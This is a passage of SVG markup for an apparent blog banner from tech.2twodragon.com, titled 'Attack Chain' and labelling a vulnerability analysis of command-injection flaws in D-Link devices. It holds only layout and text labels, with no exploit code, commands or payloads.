  <text x="80" y="245" font-size="46" font-weight="700" fill="white" font-family="sans-serif">Attack Chain</text>
  <!-- Subtitle -->
  <text x="80" y="300" font-size="19" fill="rgba(255,255,255,0.65)" font-family="sans-serif">Step-by-step exploit chain from initial access to RCE on D-Link devices</text>
  <!-- Accent line -->
  <rect x="80" y="325" width="420" height="3" fill="url(#accent)" rx="2"/>
  <!-- Category -->
  <text x="80" y="370" font-size="14" fill="rgba(255,255,255,0.5)" font-family="sans-serif" letter-spacing="2">VULNERABILITY ANALYSIS</text>
  <!-- Pill tags -->
  <rect x="80" y="402" width="90" height="36" rx="18" fill="rgba(192,57,43,0.25)" stroke="rgba(192,57,43,0.5)" stroke-width="1"/>
  <text x="125" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">D-Link</text>
  <rect x="186" y="402" width="130" height="36" rx="18" fill="rgba(211,84,0,0.2)" stroke="rgba(211,84,0,0.45)" stroke-width="1"/>
  <text x="251" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">Cmd Injection</text>
  <rect x="332" y="402" width="120" height="36" rx="18" fill="rgba(192,57,43,0.2)" stroke="rgba(192,57,43,0.4)" stroke-width="1"/>
  <text x="392" y="425" font-size="13" fill="rgba(255,255,255,0.85)" font-family="sans-serif" text-anchor="middle">Attack Chain</text>
  <!-- Bottom bar -->
  <rect x="0" y="520" width="1200" height="110" fill="rgba(0,0,0,0.3)"/>
  <text x="80" y="545" font-size="15" fill="rgba(255,255,255,0.5)" font-family="sans-serif">tech.2twodragon.com</text>
  <text x="1120" y="545" font-size="13" fill="rgba(255,255,255,0.4)" font-family="sans-serif" text-anchor="end">DevSecOps</text>
</svg>
